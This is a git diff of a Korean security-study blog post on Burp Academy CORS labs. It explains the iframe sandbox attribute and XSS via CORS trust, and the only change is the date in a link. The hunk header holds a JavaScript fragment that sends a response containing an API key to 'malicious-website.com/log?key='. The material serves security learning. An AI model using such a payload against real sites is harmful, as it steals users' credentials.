@@ -71,7 +71,7 @@ location='malicious-website.com/log?key='+this.responseText;
 
 sandbox 속성은 본래는 iframe을 더 안전하게 사용하기 위해 여러가지 제약을 가하는 용도인 것 같다. sandbox 속성자체만 부여하면 여러가지 제약이 자동으로 가해지는데 그 중에서 허용하고 싶은 것은 추가로 지정해주는 형태다. 예를 들면 `allow-scripts`, `allow-forms`, `allow-modals`등이다. 이 외에도 여러가지 있다. 위의 코드는 `allow-scripts allow-top-navigation allow-forms`의 세 가지 액션을 허용해주고 있다. 각각 스크립트 실행, top-level browsing context에 접근 허용(아마 iframe을 포함하는 부모 HTML에 접근할 수 있다는 의미인 것 같다.), 폼 제출을 허용한다는 의미이다. 
 
-[관련 문제 풀이]({% post_url 2023-07-04-burp-academy-cors-2 %})
+[관련 문제 풀이]({% post_url 2023-07-05-burp-academy-cors-2 %})
 
 ## Exploiting XSS via CORS trust relationships
 CORS 설정에 문제가 없다고 해도 신뢰하고 있는 사이트측에 XSS취약점이 있다면 그 사이트의 취약점으로 인해 인증정보가 누출되는 경우가 생긴다. 
